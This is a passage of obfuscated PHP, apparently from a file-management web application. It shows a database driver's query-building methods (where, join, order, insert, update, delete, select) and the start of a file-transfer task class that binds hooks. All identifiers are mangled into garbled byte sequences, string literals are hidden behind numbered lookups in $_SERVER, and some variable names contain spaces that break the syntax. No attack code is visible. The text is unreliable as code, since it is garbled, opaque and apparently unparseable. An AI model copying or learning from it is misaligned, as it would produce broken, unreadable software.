$×åˆáü[] = $this->parseKey($²ï”ƒı­, !1) . $ø¬à†ø[1031] . $this->parseKey($ãÁòóÅ); } else { $×åˆáü[] = $this->parseKey($ãÁòóÅ); } } $¢ü”Éø³ = implode($ø¬à†ø[50], $×åˆáü); } elseif (is_string($Æ‚‰ÜÙ¹) && !empty($Æ‚‰ÜÙ¹)) { $¢ü”Éø³ = $Æ‚‰ÜÙ¹; } else { $¢ü”Éø³ = $ø¬à†ø[189]; } return $¢ü”Éø³; } protected function parseTable($º ¥¬¶) { $Òš¼¬ù” =& $_SERVER[¹ş¤¶ĞÖ]; if (is_array($º ¥¬¶)) { $÷ªÊäô = array(); foreach ($º ¥¬¶ as $Ñò¡ªÛ => $¡Œé‰’©) { if (!is_numeric($Ñò¡ªÛ)) { $÷ªÊäô[] = $this->parseKey($Ñò¡ªÛ) . $Òš¼¬ù”[53] . $this->parseKey($¡Œé‰’©); } else { $÷ªÊäô[] = $this->parseKey($Ñò¡ªÛ); } } $º ¥¬¶ = $÷ªÊäô; } elseif (is_string($º ¥¬¶)) { if (strstr($º ¥¬¶, $Òš¼¬ù”[53])) { return $º ¥¬¶; } $º ¥¬¶ = explode($Òš¼¬ù”[50], $º ¥¬¶); array_walk($º ¥¬¶, array($this, $Òš¼¬ù”[937])); } return $Òš¼¬ù”[931] . trim(implode($Òš¼¬ù”[1032], $º ¥¬¶), $Òš¼¬ù”[414]) . $Òš¼¬ù”[931]; } protected function parseWhere($şõ¿Ñèİ) { $Â¦ÊÔ…« =& $_SERVER[¹ş¤¶ĞÖ]; $ìƒ¼èá€ = $Â¦ÊÔ…«[12]; if (is_string($şõ¿Ñèİ)) { $ìƒ¼èá€ = $şõ¿Ñèİ; } else { $«Ğè‘•¥ = isset($şõ¿Ñèİ[$Â¦ÊÔ…«[1033]]) ? strtoupper($şõ¿Ñèİ[$Â¦ÊÔ…«[1033]]) : $Â¦ÊÔ…«[12]; if (in_array($«Ğè‘•¥, array($Â¦ÊÔ…«[1034], $Â¦ÊÔ…«[1035], $Â¦ÊÔ…«[1036]))) { $«Ğè‘•¥ = $Â¦ÊÔ…«[53] . $«Ğè‘•¥ . $Â¦ÊÔ…«[53]; unset($şõ¿Ñèİ[$Â¦ÊÔ…«[1033]]); } else { $«Ğè‘•¥ = $Â¦ÊÔ…«[1037]; } foreach ($şõ¿Ñèİ as $÷ğ¡¿ë… => $Ì”—¬•×) { $ìƒ¼èá€ .= $Â¦ÊÔ…«[306]; if (is_numeric($÷ğ¡¿ë…)) { $÷ğ¡¿ë… = $Â¦ÊÔ…«[1038]; } if (0 === strpos($÷ğ¡¿ë…, $Â¦ÊÔ…«[11])) { $ìƒ¼èá€ .= $this->parseThinkWhere($÷ğ¡¿ë…, $Ì”—¬•×); } else { if (!preg_match($Â¦ÊÔ…«[1039], trim($÷ğ¡¿ë…))) { think_exception(think_lang($Â¦ÊÔ…«[1040]) . $Â¦ÊÔ…«[4] . $÷ğ¡¿ë…); } $ÄÚ¿¶Ÿ® = is_array($Ì”—¬•×) && isset($Ì”—¬•×[$Â¦ÊÔ…«[1041]]); $÷ğ¡¿ë… = trim($÷ğ¡¿ë…); if (strpos($÷ğ¡¿ë…, $Â¦ÊÔ…«[312])) { $°Å¤üë = explode($Â¦ÊÔ…«[312], $÷ğ¡¿ë…); $¬º‹’Ğê = array(); foreach ($°Å¤üë as $×ö¶ÏµÏ => $–ò«Î±Á) { $Ì¨”Áƒ« = $ÄÚ¿¶Ÿ® ? $Ì”—¬•×[$×ö¶ÏµÏ] : $Ì”—¬•×; $¬º‹’Ğê[] = $Â¦ÊÔ…«[289] . $this->parseWhereItem($this->parseKey($–ò«Î±Á), $Ì¨”Áƒ«) . $Â¦ÊÔ…«[936]; } $ìƒ¼èá€ .= implode($Â¦ÊÔ…«[1042], $¬º‹’Ğê); } elseif (strpos($÷ğ¡¿ë…, $Â¦ÊÔ…«[313])) { $°Å¤üë = explode($Â¦ÊÔ…«[313], $÷ğ¡¿ë…); $¬º‹’Ğê = array(); foreach ($°Å¤üë as $×ö¶ÏµÏ => $–ò«Î±Á) { $Ì¨”Áƒ« = $ÄÚ¿¶Ÿ® ? $Ì”—¬•×[$×ö¶ÏµÏ] : $Ì”—¬•×; $¬º‹’Ğê[] = $Â¦ÊÔ…«[289] . $this->parseWhereItem($this->parseKey($–ò«Î±Á), $Ì¨”Áƒ«) . $Â¦ÊÔ…«[936]; } $ìƒ¼èá€ .= implode($Â¦ÊÔ…«[1037], $¬º‹’Ğê); } else { $ìƒ¼èá€ .= $this->parseWhereItem($this->parseKey($÷ğ¡¿ë…), $Ì”—¬•×); } } $ìƒ¼èá€ .= $Â¦ÊÔ…«[307] . $«Ğè‘•¥; } $ìƒ¼èá€ = substr($ìƒ¼èá€, 0, -strlen($«Ğè‘•¥)); } return empty($ìƒ¼èá€) ? $Â¦ÊÔ…«[12] : $Â¦ÊÔ…«[1043] . $ìƒ¼èá€; } protected function parseWhereItem($„Íû‰Ÿ‚, $äÍÎó»â) { $†èÅ³“½ =& $_SERVER[¹ş¤¶ĞÖ]; $¤öÜÂÚ = $†èÅ³“½[12]; if (is_array($äÍÎó»â)) { if (is_string($äÍÎó»â[0])) { $÷Éá½û× = strtolower($äÍÎó»â[0]); if (in_array($äÍÎó»â[0], array($†èÅ³“½[915], $†èÅ³“½[1044], $†èÅ³“½[1045], $†èÅ³“½[1046], $†èÅ³“½[1047], $†èÅ³“½[1048]))) { $¤öÜÂÚ .= $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $äÍÎó»â[0] . $†èÅ³“½[53] . $this->parseValue($äÍÎó»â[1]); } elseif (preg_match($†èÅ³“½[1049], $äÍÎó»â[0])) { $¤öÜÂÚ .= $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $this->exp[$÷Éá½û×] . $†èÅ³“½[53] . $this->parseValue($äÍÎó»â[1]); } elseif (preg_match($†èÅ³“½[1050], $äÍÎó»â[0])) { if (is_array($äÍÎó»â[1])) { $ƒ£‚ê°É = isset($äÍÎó»â[2]) ? strtoupper($äÍÎó»â[2]) : $†èÅ³“½[1035]; if (in_array($ƒ£‚ê°É, array($†èÅ³“½[1034], $†èÅ³“½[1035], $†èÅ³“½[1036]))) { $­‚‰éÄù = array(); foreach ($äÍÎó»â[1] as $æåÊ“µ¦) { $­‚‰éÄù[] = $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $this->exp[$÷Éá½û×] . $†èÅ³“½[53] . $this->parseValue($æåÊ“µ¦); } $¤öÜÂÚ .= $†èÅ³“½[289] . implode($†èÅ³“½[53] . $ƒ£‚ê°É . $†èÅ³“½[53], $­‚‰éÄù) . $†èÅ³“½[936]; } } else { $¤öÜÂÚ .= $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $this->exp[$÷Éá½û×] . $†èÅ³“½[53] . $this->parseValue($äÍÎó»â[1]); } } elseif ($†èÅ³“½[326] == $÷Éá½û×) { $¤öÜÂÚ .= $†èÅ³“½[934] . $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $äÍÎó»â[1] . $†èÅ³“½[1051]; } elseif (preg_match($†èÅ³“½[1052], $äÍÎó»â[0])) { $¤öÜÂÚ .= $äÍÎó»â[0]; } elseif (preg_match($†èÅ³“½[1053], $äÍÎó»â[0])) { if (isset($äÍÎó»â[2]) && $†èÅ³“½[326] == $äÍÎó»â[2]) { $¤öÜÂÚ .= $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $this->exp[$÷Éá½û×] . $†èÅ³“½[53] . $äÍÎó»â[1]; } else { if (is_string($äÍÎó»â[1])) { $äÍÎó»â[1] = explode($†èÅ³“½[50], $äÍÎó»â[1]); } $åÊœú´° = implode($†èÅ³“½[50], $this->parseValue($äÍÎó»â[1])); $¤öÜÂÚ .= $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $this->exp[$÷Éá½û×] . $†èÅ³“½[934] . $åÊœú´° . $†èÅ³“½[936]; } } elseif (preg_match($†èÅ³“½[1054], $äÍÎó»â[0])) { $ë½Ú¯†Ñ = is_string($äÍÎó»â[1]) ? explode($†èÅ³“½[50], $äÍÎó»â[1]) : $äÍÎó»â[1]; $¤öÜÂÚ .= $†èÅ³“½[934] . $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $this->exp[$÷Éá½û×] . $†èÅ³“½[53] . $this->parseValue($ë½Ú¯†Ñ[0]) . $†èÅ³“½[1037] . $this->parseValue($ë½Ú¯†Ñ[1]) . $†èÅ³“½[307]; } else { think_exception(think_lang($†èÅ³“½[1040]) . $†èÅ³“½[4] . $äÍÎó»â[0]); } } else { $ÖÃ»Óä® = count($äÍÎó»â); $Òò¢ÊÀ = $†èÅ³“½[12]; if (is_string($äÍÎó»â[$ÖÃ»Óä® - 1])) { $Òò¢ÊÀ = isset($äÍÎó»â[$ÖÃ»Óä® - 1]) ? strtoupper($äÍÎó»â[$ÖÃ»Óä® - 1]) : $†èÅ³“½[12]; if (in_array($Òò¢ÊÀ, array($†èÅ³“½[1034], $†èÅ³“½[1035], $†èÅ³“½[1036]))) { $ÖÃ»Óä® = $ÖÃ»Óä® - 1; } } else { $Òò¢ÊÀ = $†èÅ³“½[1034]; } for ($êš„Ûãå = 0; $êš„Ûãå < $ÖÃ»Óä®; $êš„Ûãå++) { $ë½Ú¯†Ñ = is_array($äÍÎó»â[$êš„Ûãå]) ? $äÍÎó»â[$êš„Ûãå][1] : $äÍÎó»â[$êš„Ûãå]; if ($†èÅ³“½[326] == strtolower($äÍÎó»â[$êš„Ûãå][0])) { $¤öÜÂÚ .= $†èÅ³“½[289] . $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $ë½Ú¯†Ñ . $†èÅ³“½[1051] . $Òò¢ÊÀ . $†èÅ³“½[53]; } else { $ÇÔØ¸‰ = is_array($äÍÎó»â[$êš„Ûãå]) ? $this->exp[strtolower($äÍÎó»â[$êš„Ûãå][0])] : $†èÅ³“½[915]; if (!$ÇÔØ¸‰ && is_array($äÍÎó»â[$êš„Ûãå]) && in_array($äÍÎó»â[$êš„Ûãå][0], array($†èÅ³“½[915], $†èÅ³“½[1044], $†èÅ³“½[1045], $†èÅ³“½[1046], $†èÅ³“½[1047], $†èÅ³“½[1048]))) { $ÇÔØ¸‰ = $äÍÎó»â[$êš„Ûãå][0]; } $¤öÜÂÚ .= $†èÅ³“½[289] . $„Íû‰Ÿ‚ . $†èÅ³“½[53] . $ÇÔØ¸‰ . $†èÅ³“½[53] . $this->parseValue($ë½Ú¯†Ñ) . $†èÅ³“½[1051] . $Òò¢ÊÀ . $†èÅ³“½[53]; } } $¤öÜÂÚ = substr($¤öÜÂÚ, 0, -4); } } else { $¤öÜÂÚ .= $„Íû‰Ÿ‚ . $†èÅ³“½[1055] . $this->parseValue($äÍÎó»â); } return $¤öÜÂÚ; } protected function parseThinkWhere($¿÷° °, $å€†Š) { $ªé„ş¼é =& $_SERVER[¹ş¤¶ĞÖ]; $¨µ•ŒÜÍ = $ªé„ş¼é[12]; switch ($¿÷° °) { case $ªé„ş¼é[381]: $¨µ•ŒÜÍ = $å€†Š; break; case $ªé„ş¼é[1038]: $¨µ•ŒÜÍ = is_string($å€†Š) ? $å€†Š : substr($this->parseWhere($å€†Š), 6); break; case $ªé„ş¼é[1056]: parse_str($å€†Š, $Ôˆ»œ×è); if (isset($Ôˆ»œ×è[$ªé„ş¼é[1033]])) { $ªìœÅ•× = $ªé„ş¼é[53] . strtoupper($Ôˆ»œ×è[$ªé„ş¼é[1033]]) . $ªé„ş¼é[53]; unset($Ôˆ»œ×è[$ªé„ş¼é[1033]]); } else { $ªìœÅ•× = $ªé„ş¼é[1037]; } $şÖ˜õİÃ = array(); foreach ($Ôˆ»œ×è as $²ôÊİœ => $µÃÓé) { $şÖ˜õİÃ[] = $this->parseKey($²ôÊİœ) . $ªé„ş¼é[1055] . $this->parseValue($µÃÓé); } $¨µ•ŒÜÍ = implode($ªìœÅ•×, $şÖ˜õİÃ); break; } return $¨µ•ŒÜÍ; } protected function parseLimit($ÆûØ¡º) { $­Ì‘…± =& $_SERVER[¹ş¤¶ĞÖ]; return !empty($ÆûØ¡º) ? $­Ì‘…±[51] . $ÆûØ¡º . $­Ì‘…±[53] : $­Ì‘…±[12]; } protected function parseJoin($áº˜¶³¥) { $¸¸ì¸Î =& $_SERVER[¹ş¤¶ĞÖ]; $«¨•ŒÔâ = $¸¸ì¸Î[12]; if (!empty($áº˜¶³¥)) { if (is_array($áº˜¶³¥)) { foreach ($áº˜¶³¥ as $è÷ı‘èÆ => $Á“ÆÜ›©) { if (!1 !== stripos($Á“ÆÜ›©, $¸¸ì¸Î[1057])) { $«¨•ŒÔâ .= $¸¸ì¸Î[53] . $Á“ÆÜ›©; } else { $«¨•ŒÔâ .= $¸¸ì¸Î[1058] . $Á“ÆÜ›©; } } } else { $«¨•ŒÔâ .= $¸¸ì¸Î[1058] . $áº˜¶³¥; } } $«¨•ŒÔâ = preg_replace($¸¸ì¸Î[1059], think_config($¸¸ì¸Î[961]) . $¸¸ì¸Î[1060], $«¨•ŒÔâ); return $«¨•ŒÔâ; } protected function parseOrder($¾ö¥ÉÍ) { $ÕÄ‰şğã =& $_SERVER[¹ş¤¶ĞÖ]; if (is_array($¾ö¥ÉÍ)) { $ƒÌù¼† = array(); foreach ($¾ö¥ÉÍ as $ş ¡¦« => $Š¬ØñÊ¶) { if (is_numeric($ş ¡¦«)) { $ƒÌù¼†[] = $this->parseKey($Š¬ØñÊ¶); } else { $Š¬ØñÊ¶ = in_array(strtoupper(trim($Š¬ØñÊ¶)), array($ÕÄ‰şğã[1061], $ÕÄ‰şğã[1062])) ? $ÕÄ‰şğã[53] . $Š¬ØñÊ¶ : $ÕÄ‰şğã[12]; if (preg_match($ÕÄ‰şğã[1063], $ş ¡¦«)) { $ƒÌù¼†[] = $this->parseKey($ş ¡¦«) . $Š¬ØñÊ¶; } else { think_exception($ÕÄ‰şğã[1064] . $ş ¡¦«); } } } $¾ö¥ÉÍ = implode($ÕÄ‰şğã[50], $ƒÌù¼†); } return !empty($¾ö¥ÉÍ) ? $ÕÄ‰şğã[1065] . $¾ö¥ÉÍ : $ÕÄ‰şğã[12]; } protected function parseGroup($Á¡òĞË’) { $ŠÀÅù£ã =& $_SERVER[¹ş¤¶ĞÖ]; return !empty($Á¡òĞË’) ? $ŠÀÅù£ã[1066] . $Á¡òĞË’ : $ŠÀÅù£ã[12]; } protected function parseHaving($¸–‡´›) { $İáåÃØ¹ =& $_SERVER[¹ş¤¶ĞÖ]; return !empty($¸–‡´›) ? $İáåÃØ¹[1067] . $¸–‡´› : $İáåÃØ¹[12]; } protected function parseComment($„È‹ÎÔÎ) { $Ù¦»Œß³ =& $_SERVER[¹ş¤¶ĞÖ]; return !empty($„È‹ÎÔÎ) ? $Ù¦»Œß³[1068] . $„È‹ÎÔÎ . $Ù¦»Œß³[1069] : $Ù¦»Œß³[12]; } protected function parseDistinct($Ì¯ˆª„È) { $ş„¡Èâ· =& $_SERVER[¹ş¤¶ĞÖ]; return !empty($Ì¯ˆª„È) ? $ş„¡Èâ·[1070] : $ş„¡Èâ·[12]; } protected function parseUnion($Éèô—Ì) { $ë¢ŒÅéö =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($Éèô—Ì)) { return $ë¢ŒÅéö[12]; } if (isset($Éèô—Ì[$ë¢ŒÅéö[377]])) { $û½÷…ªÏ = $ë¢ŒÅéö[1071]; unset($Éèô—Ì[$ë¢ŒÅéö[377]]); } else { $û½÷…ªÏ = $ë¢ŒÅéö[1072]; } foreach ($Éèô—Ì as $ûì®÷·¢) { $Ùè½•”ñ[] = $û½÷…ªÏ . (is_array($ûì®÷·¢) ? $this->buildSelectSql($ûì®÷·¢) : $ûì®÷·¢); } return implode($ë¢ŒÅéö[53], $Ùè½•”ñ); } public function insert($»¹›æÜø, $²È£­–¼ = array(), $Öâ© ‡ = false) { $…¦šÒ± =& $_SERVER[¹ş¤¶ĞÖ]; $ÂÏ¹šÁ· = $†ÈĞ¼Ù› = array(); $this->model = $²È£­–¼[$…¦šÒ±[310]]; foreach ($»¹›æÜø as $í§ ‘ªå => $ìëˆ¤×€) { if (is_array($ìëˆ¤×€) && $…¦šÒ±[326] == $ìëˆ¤×€[0]) { $†ÈĞ¼Ù›[] = $this->parseKey($í§ ‘ªå); $ÂÏ¹šÁ·[] = $ìëˆ¤×€[1]; } elseif (is_scalar($ìëˆ¤×€) || is_null($ìëˆ¤×€)) { $†ÈĞ¼Ù›[] = $this->parseKey($í§ ‘ªå); $ÂÏ¹šÁ·[] = $this->parseValue($ìëˆ¤×€); } } $¶ Õµ › = ($Öâ© ‡ ? $…¦šÒ±[938] : $…¦šÒ±[939]) . $…¦šÒ±[940] . $this->parseTable($²È£­–¼[$…¦šÒ±[308]]) . $…¦šÒ±[934] . implode($…¦šÒ±[50], $†ÈĞ¼Ù›) . $…¦šÒ±[935] . implode($…¦šÒ±[50], $ÂÏ¹šÁ·) . $…¦šÒ±[936]; $¶ Õµ › .= $this->parseLock(isset($²È£­–¼[$…¦šÒ±[869]]) ? $²È£­–¼[$…¦šÒ±[869]] : !1); $¶ Õµ › .= $this->parseComment(!empty($²È£­–¼[$…¦šÒ±[383]]) ? $²È£­–¼[$…¦šÒ±[383]] : $…¦šÒ±[12]); return $this->execute($¶ Õµ ›, $this->parseBind(!empty($²È£­–¼[$…¦šÒ±[314]]) ? $²È£­–¼[$…¦šÒ±[314]] : array())); } public function selectInsert($£¬ä¤ğÚ, $ú™«¡¥Î, $¦—Ø£Ô¿ = array()) { $±«Ä±¾¯ =& $_SERVER[¹ş¤¶ĞÖ]; $this->model = $¦—Ø£Ô¿[$±«Ä±¾¯[310]]; if (is_string($£¬ä¤ğÚ)) { $£¬ä¤ğÚ = explode($±«Ä±¾¯[50], $£¬ä¤ğÚ); } array_walk($£¬ä¤ğÚ, array($this, $±«Ä±¾¯[937])); $ûñä¬ â = $±«Ä±¾¯[1073] . $this->parseTable($ú™«¡¥Î) . $±«Ä±¾¯[934] . implode($±«Ä±¾¯[50], $£¬ä¤ğÚ) . $±«Ä±¾¯[1051]; $ûñä¬ â .= $this->buildSelectSql($¦—Ø£Ô¿); return $this->execute($ûñä¬ â, $this->parseBind(!empty($¦—Ø£Ô¿[$±«Ä±¾¯[314]]) ? $¦—Ø£Ô¿[$±«Ä±¾¯[314]] : array())); } public function update($¯™ô¤á, $±·—Ç) { $“â‡şÑñ =& $_SERVER[¹ş¤¶ĞÖ]; $this->model = $±·—Ç[$“â‡şÑñ[310]]; $ÛÃô×£ = $“â‡şÑñ[1074] . $this->parseTable($±·—Ç[$“â‡şÑñ[308]]) . $this->parseSet($¯™ô¤á) . $this->parseWhere(!empty($±·—Ç[$“â‡şÑñ[304]]) ? $±·—Ç[$“â‡şÑñ[304]] : $“â‡şÑñ[12]) . $this->parseOrder(!empty($±·—Ç[$“â‡şÑñ[394]]) ? $±·—Ç[$“â‡şÑñ[394]] : $“â‡şÑñ[12]) . $this->parseLimit(!empty($±·—Ç[$“â‡şÑñ[321]]) ? $±·—Ç[$“â‡şÑñ[321]] : $“â‡şÑñ[12]) . $this->parseLock(isset($±·—Ç[$“â‡şÑñ[869]]) ? $±·—Ç[$“â‡şÑñ[869]] : !1) . $this->parseComment(!empty($±·—Ç[$“â‡şÑñ[383]]) ? $±·—Ç[$“â‡şÑñ[383]] : $“â‡şÑñ[12]); return $this->execute($ÛÃô×£, $this->parseBind(!empty($±·—Ç[$“â‡şÑñ[314]]) ? $±·—Ç[$“â‡şÑñ[314]] : array())); } public function delete($‡Ø©İƒç = array()) { $‘§‡¤»Ò =& $_SERVER[¹ş¤¶ĞÖ]; $this->model = $‡Ø©İƒç[$‘§‡¤»Ò[310]]; $±ìÚ à¼ = $‘§‡¤»Ò[1075] . $this->parseTable($‡Ø©İƒç[$‘§‡¤»Ò[308]]) . $this->parseWhere(!empty($‡Ø©İƒç[$‘§‡¤»Ò[304]]) ? $‡Ø©İƒç[$‘§‡¤»Ò[304]] : $‘§‡¤»Ò[12]) . $this->parseOrder(!empty($‡Ø©İƒç[$‘§‡¤»Ò[394]]) ? $‡Ø©İƒç[$‘§‡¤»Ò[394]] : $‘§‡¤»Ò[12]) . $this->parseLimit(!empty($‡Ø©İƒç[$‘§‡¤»Ò[321]]) ? $‡Ø©İƒç[$‘§‡¤»Ò[321]] : $‘§‡¤»Ò[12]) . $this->parseLock(isset($‡Ø©İƒç[$‘§‡¤»Ò[869]]) ? $‡Ø©İƒç[$‘§‡¤»Ò[869]] : !1) . $this->parseComment(!empty($‡Ø©İƒç[$‘§‡¤»Ò[383]]) ? $‡Ø©İƒç[$‘§‡¤»Ò[383]] : $‘§‡¤»Ò[12]); return $this->execute($±ìÚ à¼, $this->parseBind(!empty($‡Ø©İƒç[$‘§‡¤»Ò[314]]) ? $‡Ø©İƒç[$‘§‡¤»Ò[314]] : array())); } public function select($‡‰¢İ— = array()) { $ö¯øŒßÍ =& $_SERVER[¹ş¤¶ĞÖ]; $this->model = $‡‰¢İ—[$ö¯øŒßÍ[310]]; $”ù¼ï = $this->buildSelectSql($‡‰¢İ—); $œ‚â¡ŞĞ = isset($‡‰¢İ—[$ö¯øŒßÍ[378]]) ? $‡‰¢İ—[$ö¯øŒßÍ[378]] : !1; if ($œ‚â¡ŞĞ) { $€…¦ıó = is_string($œ‚â¡ŞĞ[$ö¯øŒßÍ[94]]) ? $œ‚â¡ŞĞ[$ö¯øŒßÍ[94]] : $ö¯øŒßÍ[1076] . md5($”ù¼ï); $™ŸêÃŒÃ = think_cache($€…¦ıó, $ö¯øŒßÍ[12], $œ‚â¡ŞĞ); if (!1 !== $™ŸêÃŒÃ) { return $™ŸêÃŒÃ; } } $üíÅ½Éô = $this->query($”ù¼ï, $this->parseBind(!empty($‡‰¢İ—[$ö¯øŒßÍ[314]]) ? $‡‰¢İ—[$ö¯øŒßÍ[314]] : array())); if ($œ‚â¡ŞĞ && !1 !== $üíÅ½Éô) { think_cache($€…¦ıó, $üíÅ½Éô, $œ‚â¡ŞĞ); } return $üíÅ½Éô; } public function buildSelectSql($°Úúçœı = array()) { $‘öùÔó¤ =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($°Úúçœı[$‘öùÔó¤[382]])) { if (strpos($°Úúçœı[$‘öùÔó¤[382]], $‘öùÔó¤[50])) { list($Ù÷è®éÆ, $İğúÇı¤) = explode($‘öùÔó¤[50], $°Úúçœı[$‘öùÔó¤[382]]); } else { $Ù÷è®éÆ = $°Úúçœı[$‘öùÔó¤[382]]; } $Ù÷è®éÆ = $Ù÷è®éÆ ? $Ù÷è®éÆ : 1; $İğúÇı¤ = isset($İğúÇı¤) ? $İğúÇı¤ : (is_numeric($°Úúçœı[$‘öùÔó¤[321]]) ? $°Úúçœı[$‘öùÔó¤[321]] : 20); $æ¿ŠÃùÛ = $İğúÇı¤ * ((int) $Ù÷è®éÆ - 1); $°Úúçœı[$‘öùÔó¤[321]] = $æ¿ŠÃùÛ . $‘öùÔó¤[50] . $İğúÇı¤; } if (think_config($‘öùÔó¤[1077])) { $µÈÉû¥‰ = $‘öùÔó¤[1078] . md5(serialize($°Úúçœı)); $¼‰åñ¶³ = think_cache($µÈÉû¥‰); if ($¼‰åñ¶³) { return $¼‰åñ¶³; } } $ºƒ—ŞÙ = $this->parseSql($this->selectSql, $°Úúçœı); $ºƒ—ŞÙ .= $this->parseLock(isset($°Úúçœı[$‘öùÔó¤[869]]) ? $°Úúçœı[$‘öùÔó¤[869]] : !1); if (isset($µÈÉû¥‰)) { think_cache($µÈÉû¥‰, $ºƒ—ŞÙ); } return $ºƒ—ŞÙ; } public function parseSql($Ëš‹ã–, $‰æÔ¶Üç = array()) { $œıü¹¿ß =& $_SERVER[¹ş¤¶ĞÖ]; $Ëš‹ã– = str_replace(array($œıü¹¿ß[1079], $œıü¹¿ß[1080], $œıü¹¿ß[1081], $œıü¹¿ß[1082], $œıü¹¿ß[1083], $œıü¹¿ß[1084], $œıü¹¿ß[1085], $œıü¹¿ß[1086], $œıü¹¿ß[1087], $œıü¹¿ß[1088], $œıü¹¿ß[1089]), array($this->parseTable("{$‰æÔ¶Üç[$œıü¹¿ß[308]]}"), $this->parseDistinct(isset($‰æÔ¶Üç[$œıü¹¿ß[1090]]) ? $‰æÔ¶Üç[$œıü¹¿ß[1090]] : !1), $this->parseField(!empty($‰æÔ¶Üç[$œıü¹¿ß[302]]) ? $‰æÔ¶Üç[$œıü¹¿ß[302]] : $œıü¹¿ß[189]), $this->parseJoin(!empty($‰æÔ¶Üç[$œıü¹¿ß[311]]) ? $‰æÔ¶Üç[$œıü¹¿ß[311]] : $œıü¹¿ß[12]), $this->parseWhere(!empty($‰æÔ¶Üç[$œıü¹¿ß[304]]) ? $‰æÔ¶Üç[$œıü¹¿ß[304]] : $œıü¹¿ß[12]), $this->parseGroup(!empty($‰æÔ¶Üç[$œıü¹¿ß[534]]) ? $‰æÔ¶Üç[$œıü¹¿ß[534]] : $œıü¹¿ß[12]), $this->parseHaving(!empty($‰æÔ¶Üç[$œıü¹¿ß[1091]]) ? $‰æÔ¶Üç[$œıü¹¿ß[1091]] : $œıü¹¿ß[12]), $this->parseOrder(!empty($‰æÔ¶Üç[$œıü¹¿ß[394]]) ? $‰æÔ¶Üç[$œıü¹¿ß[394]] : $œıü¹¿ß[12]), $this->parseLimit(!empty($‰æÔ¶Üç[$œıü¹¿ß[321]]) ? $‰æÔ¶Üç[$œıü¹¿ß[321]] : $œıü¹¿ß[12]), $this->parseUnion(!empty($‰æÔ¶Üç[$œıü¹¿ß[376]]) ? $‰æÔ¶Üç[$œıü¹¿ß[376]] : $œıü¹¿ß[12]), $this->parseComment(!empty($‰æÔ¶Üç[$œıü¹¿ß[383]]) ? $‰æÔ¶Üç[$œıü¹¿ß[383]] : $œıü¹¿ß[12])), $Ëš‹ã–); return $Ëš‹ã–; } public function getLastSql($ëª´¶Šà = '') { return $ëª´¶Šà ? $this->modelSql[$ëª´¶Šà] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ùÍñ‘üİ) { return addslashes($ùÍñ‘üİ); } public function setModel($áÀÊ‰) { $this->model = $áÀÊ‰; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto e„ÂˆÌå¸ª; F–ˆ§¦ËÀÃ: class TaskFileTransfer extends Task { protected function startAfter() { $©•×°âÁ =& $_SERVER[¹ş¤¶ĞÖ]; $øÉ­•û =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($©•×°âÁ[1706], array($this, $©•×°âÁ[1707])); Hook::bind($©•×°âÁ[1256], array($this, $©•×°âÁ[1708])); Hook::bind($©•×°âÁ[1709], array($this, $©•×°âÁ[1710])); Hook::bind($©•×°âÁ[625], array($this, $©•×°âÁ[1711])); Hook::bind($©•×°âÁ[626], array($this, $©•×°âÁ[1712])); Hook::bind($©•×°âÁ[631], array($this, $©•×°âÁ[1713])); Hook::bind($©•×°âÁ[632], array($this, $©•×°âÁ[1714])); Hook::bind($©•×°âÁ[628], array($this, $©•×°âÁ[1715])); Hook::bind($©•×°âÁ[629], array($this, $©•×°âÁ[1716])); Hook::bind($©•×°âÁ[594], array($this, $©•×°âÁ[1717])); Hook::bind($©•×°âÁ[591], array($this, $©•×°âÁ[1717])); Hook::bind($©•×°âÁ[596], array($this, $©•×°âÁ[1717])); Hook::bind($©•×°âÁ[598], array($this, $©•×°âÁ[1717])); Hook::bind($©•×°âÁ[600], array($this, $©•×°âÁ[1717])); Hook::bind($©•×°âÁ[1718], array($this, $©•×°âÁ[1719])); Hook::bind($©•×°âÁ[616], array($this, $©•×°âÁ[1720])); $this->sourceModelCopyFlag = !1; Hook::bind($©•×°âÁ[1721], array($this, $©•×°âÁ[1722])); Hook::bind($©•×°âÁ[1723], array($this, $©•×°âÁ[1724])); Hook::bind($©•×°âÁ[1725], array($this, $©•×°âÁ[1726])); $øÉ­•û[$©•×°âÁ[1727]] = LNG($©•×°âÁ[1728]); $øÉ­•û[$©•×°âÁ[1729]] = 0; $øÉ­•û[$©•×°âÁ[1730]] = 0; $øÉ­•û[$©•×°âÁ[1097]] = $©•×°âÁ[12]; $øÉ­•û[$©•×°âÁ[1731]] = $©•×°âÁ[12]; $øÉ­•û[$©•×°âÁ[1732]] = 0; $øÉ­•û[$©•×°âÁ[1733]] = 0; $øÉ­•û[$©•×°âÁ[1734]] = 0; if (!$øÉ­•û[$©•×°âÁ[1574]]) { $øÉ­•û[$©•×°âÁ[1574]] = LNG($©•×°âÁ[1735]); } } protected function endAfter() { $‚»ñŞæ =& $_SERVER[¹ş¤¶ĞÖ]; Hook::unbind($‚»ñŞæ[1706], array($this, $‚»ñŞæ[1707])); Hook::unbind($‚»ñŞæ[1256], array($this, $‚»ñŞæ[1708])); Hook::unbind($‚»ñŞæ[1709], array($this, $‚»ñŞæ[1710])); Hook::unbind($‚»ñŞæ[625], array($this, $‚»ñŞæ[1711])); Hook::unbind($‚»ñŞæ[626], array($this, $‚»ñŞæ[1712])); Hook::unbind($‚»ñŞæ[631], array($this, $‚»ñŞæ[1713])); Hook::unbind($‚»ñŞæ[632], array($this, $‚»ñŞæ[1714])); Hook::unbind($‚»ñŞæ[628], array($this, $‚»ñŞæ[1715])); Hook::unbind($‚»ñŞæ[629], array($this, $‚»ñŞæ[1716])); Hook::unbind($‚»ñŞæ[594], array($this, $‚»ñŞæ[1717])); Hook::unbind($‚»ñŞæ[591], array($this, $‚»ñŞæ[1717])); Hook::unbind($‚»ñŞæ[596], array($this, $‚»ñŞæ[1717])); Hook::unbind($‚»ñŞæ[598], array($this, 